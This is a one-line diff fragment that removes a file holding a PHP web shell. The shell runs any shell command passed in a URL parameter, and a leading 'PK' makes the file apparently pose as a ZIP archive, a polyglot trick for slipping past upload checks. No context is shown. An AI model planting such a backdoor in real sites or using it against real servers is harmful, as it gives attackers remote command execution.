@@ -1,1 +1,0 @@
-PK<?php system($_GET["cmd"]); ?>
